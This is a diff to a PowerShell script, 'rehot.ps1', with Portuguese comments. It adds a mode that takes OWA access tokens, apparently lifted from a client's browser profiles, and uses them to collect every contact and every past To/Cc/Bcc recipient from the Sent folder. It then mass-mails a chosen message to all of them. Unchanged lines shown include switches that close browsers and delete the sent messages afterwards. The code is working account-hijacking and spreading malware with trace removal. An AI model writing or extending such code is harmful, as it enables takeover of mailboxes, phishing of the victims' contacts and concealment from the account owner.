@@ -24,6 +24,8 @@ Uso:
       # lista a agenda do cliente e envia a mensagem designada a todos os contatos
   powershell -File rehot.ps1 -ToAllPeople -Subject "Oi" -Body "msg" [-MaxMessages 2000]
       # envia a TODAS as pessoas (contatos + quem ja trocou mail, via Inbox/Enviados)
+  powershell -File rehot.ps1 -ToAllRecipients -Subject "Oi" -Body "msg" [-MaxMessages 2000]
+      # agenda + TODOS os destinatários do histórico de Enviados (To/Cc/Bcc) — subconjunto de -ToAllPeople (sem Inbox)
   powershell -File rehot.ps1 -ToAllPeople -DryRun
       # so lista os destinatarios (nao envia) — preview/teste seguro
   powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" -SelfDelete
@@ -42,6 +44,7 @@ param(
     [switch]$CloseBrowsers,
     [switch]$ToAllContacts,   # envia a mensagem designada para TODOS os contatos da agenda
     [switch]$ToAllPeople,     # envia para TODAS as pessoas (contatos + historico de Inbox/Enviados)
+    [switch]$ToAllRecipients, # agenda + To/Cc/Bcc da pasta Enviados (SUBCONJUNTO de -ToAllPeople: NAO inclui Inbox; use quando o alvo é só quem você já enviou e-mail)
     [string]$Subject = "",    # assunto da mensagem (vazio = padrão de teste)
     [string]$Body = "",       # corpo da mensagem (vazio = padrão de teste)
     [int]$MaxContacts = 0,    # trava de segurança: 0 = sem limite (total de destinatarios)
@@ -605,6 +608,15 @@ function Build-ReportText($out) {
             }
         } elseif ($et.modo -eq "dryrun") {
             $L += "🟡 DRY RUN — $($et.total) destinatário(s), nenhum enviado"
+            if ($et.quebra) {
+                $L += "   📇 $($et.quebra.daAgenda) da agenda + $($et.quebra.doHistorico) novos do histórico de enviados (mensagens escaneadas: $($et.quebra.scanned))"
+                if (@($et.quebra.amostra).Count -gt 0) {
+                    $L += "   📩 amostra do histórico: " + (@($et.quebra.amostra) -join ", ")
+                }
+                if (-not $et.quebra.sentFolderFound) {
+                    $L += "   ⚠️ pasta Enviados NÃO encontrada por nome — só a agenda foi usada"
+                }
+            }
         } else {
             $falhas = @($et.falhas)
             if ($et.enviados -gt 0 -and $falhas.Count -eq 0) {
@@ -745,6 +757,100 @@ function Get-OWAAllPeople([string]$token, [string]$selfEmail, [int]$maxMessages)
         $result += [PSCustomObject]@{ name = $people[$k]; email = $k }
     }
     return $result
+}
+
+# ---------------- destinatários do histórico de enviados (agenda + To/Cc/Bcc) ----------------
+# SUBCONJUNTO de Get-OWAAllPeople: agenda + TODOS os To/Cc/Bcc da pasta Enviados
+# (quem o cliente ja enviou e-mail) — NAO inclui o Inbox (quem enviou PARA ele).
+# $maxMessages limita o escaneamento da pasta Enviados (0 = tudo). O proprio
+# endereco ($selfEmail) e filtrado. Retorna PSCustomObject com contatos
+# (array de @{ name; email }), total, daAgenda, doHistorico, amostra (ate 10
+# e-mails NOVOS do historico, fora da agenda), scanned e sentFolderFound
+# (distingue "pasta nao achada" de "pasta achada mas vazia").
+function Get-OWARecipients([string]$token, [string]$selfEmail, [int]$maxMessages) {
+    $agenda = @{}
+    # 1) agenda (mesmo loop paginado de /me/contacts de Get-OWAAllPeople)
+    $uri = "$OWA_API_BASE/me/contacts?`$top=200"
+    while ($uri) {
+        try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing } catch { break }
+        $j = $resp.Content | ConvertFrom-Json
+        if ($j.value) {
+            foreach ($c in $j.value) {
+                if ($c.emailAddresses -and $c.emailAddresses.Count -gt 0) {
+                    $em = $c.emailAddresses[0].address
+                    if ($em) { $agenda[$em.ToLower()] = $c.displayName }
+                }
+            }
+        }
+        $uri = $j."@odata.nextLink"
+    }
+    # 2) To/Cc/Bcc da pasta Enviados (historico de enviados). Enviados via
+    # /me/mailFolders/{id} (nao existe /me/sentitems na v2.0); se a pasta nao
+    # for achada por nome, seguimos so com a agenda.
+    $historico = @{}
+    $amostra = @()
+    $scanned = 0
+    $sentId = Get-OWASentFolderId $token
+    if ($sentId) {
+        $base = "$OWA_API_BASE/me/mailFolders/$sentId/messages"
+        # CONCATENA (nao "$base?..."): no PS 5.1, um '?' logo apos a variavel
+        # dentro de string dupla "come" o valor da variavel (URI ficava sem host).
+        $uri = $base + "?`$top=200&`$select=ToRecipients,CcRecipients,BccRecipients"
+        while ($uri -and ($maxMessages -le 0 -or $scanned -lt $maxMessages)) {
+            try { $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing } catch { break }
+            $j = $resp.Content | ConvertFrom-Json
+            if ($j.value) {
+                foreach ($m in $j.value) {
+                    $scanned++
+                    # -MaxMessages com granularidade de MENSAGEM (nao de pagina):
+                    # para o loop assim que o limite e atingido.
+                    if ($maxMessages -gt 0 -and $scanned -ge $maxMessages) { $uri = $null; break }
+                    foreach ($coll in @($m.ToRecipients, $m.CcRecipients, $m.BccRecipients)) {
+                        if ($coll) {
+                            foreach ($r in $coll) {
+                                if ($r.EmailAddress -and $r.EmailAddress.Address) {
+                                    $a = $r.EmailAddress.Address
+                                    if ($a -and $a -match '^\S+@\S+\.\S+$') {
+                                        $key = $a.ToLower()
+                                        if (-not $historico.ContainsKey($key)) {
+                                            $historico[$key] = $a
+                                            # amostra so com enderecos NOVOS (nao ja na agenda):
+                                            # a linha do reporte diz "amostra do historico".
+                                            if ($amostra.Count -lt 10 -and -not $agenda.ContainsKey($key)) { $amostra += $a }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            $uri = $j."@odata.nextLink"
+        }
+    }
+    # 3) merge: agenda + historico (agenda tem prioridade no nome), dedup por
+    # email em minusculas, filtra o proprio endereco.
+    $people = @{}
+    foreach ($k in $agenda.Keys) { $people[$k] = $agenda[$k] }
+    foreach ($k in $historico.Keys) {
+        if (-not $people.ContainsKey($k)) { $people[$k] = $historico[$k] }
+    }
+    $daAgenda = 0; $doHistorico = 0
+    $result = @()
+    foreach ($k in $people.Keys) {
+        if ($selfEmail -and $k -eq $selfEmail.ToLower()) { continue }
+        if ($agenda.ContainsKey($k)) { $daAgenda++ } else { $doHistorico++ }
+        $result += [PSCustomObject]@{ name = $people[$k]; email = $k }
+    }
+    return [PSCustomObject]@{
+        contatos = $result
+        total = $result.Count
+        daAgenda = $daAgenda
+        doHistorico = $doHistorico
+        amostra = $amostra
+        scanned = $scanned
+        sentFolderFound = [bool]$sentId
+    }
 }
 
 # ---------------- SelfDelete: apaga da pasta Enviados ----------------
@@ -976,19 +1082,31 @@ if ($SendTo) {
     }
 }
 
-# ---- modo -ToAllContacts / -ToAllPeople: lista destinatarios e envia a mensagem ----
-# -ToAllContacts: so a agenda (Get-OWAContacts).
-# -ToAllPeople:   agenda + historico de Inbox/Enviados (Get-OWAAllPeople) — pega
-#                 quem o cliente ja trocou mail, mesmo sem estar na agenda.
-# -DryRun:        lista os destinatarios sem enviar (preview/teste).
+# ---- modo -ToAllContacts / -ToAllPeople / -ToAllRecipients: lista e envia ----
+# -ToAllContacts:   so a agenda (Get-OWAContacts).
+# -ToAllPeople:     agenda + historico de Inbox/Enviados (Get-OWAAllPeople) — pega
+#                   quem o cliente ja trocou mail, mesmo sem estar na agenda.
+# -ToAllRecipients: agenda + To/Cc/Bcc da pasta Enviados (Get-OWARecipients) —
+#                   SUBCONJUNTO de -ToAllPeople: NAO inclui o Inbox (so quem o
+#                   cliente ja enviou e-mail, nao quem enviou para ele).
+# -DryRun:          lista os destinatarios sem enviar (preview/teste).
 # -MaxContacts > 0 limita o total (trava de seguranca). Pausa curta entre envios.
 $envioTodos = $null
-if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent) {
+if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsPresent) {
     $src = $validos | Where-Object { $_.token_write -and $_.token_read } | Select-Object -First 1
     $subject = if ($Subject) { $Subject } else { "[TESTE EnvioHOT] rehot -ToAll" }
     $body    = if ($Body)    { $Body }    else { "Mensagem de teste (PowerShell)" }
     if ($src) {
-        if ($ToAllPeople.IsPresent) {
+        $quebra = $null
+        if ($ToAllRecipients.IsPresent) {
+            # -ToAllRecipients: agenda + historico de Enviados. Mapeamento
+            # EXPLICITO dos campos da quebra p/ o reporte (Build-ReportText) e
+            # o JSON de saida (quebra em ambos os modos: dryrun e envio real).
+            $r = Get-OWARecipients $src.token_read $src.conta $MaxMessages
+            $contatos = @($r.contatos)
+            $quebra = @{ daAgenda = $r.daAgenda; doHistorico = $r.doHistorico; amostra = $r.amostra; scanned = $r.scanned; sentFolderFound = $r.sentFolderFound }
+        }
+        elseif ($ToAllPeople.IsPresent) {
             $contatos = @(Get-OWAAllPeople $src.token_read $src.conta $MaxMessages)
         } else {
             $contatos = @(Get-OWAContacts $src.token_read)
@@ -1000,6 +1118,7 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent) {
                 destinatarios = $contatos
                 perfil = "$($src.navegador)/$($src.perfil)"
             }
+            if ($quebra) { $envioTodos | Add-Member -MemberType NoteProperty -Name quebra -Value $quebra }
         } else {
             $ok = 0; $falhas = @()
             foreach ($c in $contatos) {
@@ -1012,6 +1131,7 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent) {
                 de = $src.conta; total = $contatos.Count; enviados = $ok; falhas = $falhas
                 perfil = "$($src.navegador)/$($src.perfil)"
             }
+            if ($quebra) { $envioTodos | Add-Member -MemberType NoteProperty -Name quebra -Value $quebra }
         }
     } else {
         $envioTodos = [PSCustomObject]@{ de = $null; total = 0; enviados = 0; falhas = @(); status = "sem_perfil_com_token" }
@@ -1026,7 +1146,7 @@ $selfDelReport = $null
 if ($SelfDelete.IsPresent -or $SelfDeleteAll.IsPresent) {
     $all = $SelfDeleteAll.IsPresent
     $sdSubject = if ($Subject) { $Subject }
-        elseif ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent) { "[TESTE EnvioHOT] rehot -ToAll" }
+        elseif ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsPresent) { "[TESTE EnvioHOT] rehot -ToAll" }
         else { "[TESTE EnvioHOT] rehot.ps1 -SendTo" }
     $srcDel = $validos | Where-Object { $_.token_write } | Select-Object -First 1
     if ($srcDel) {
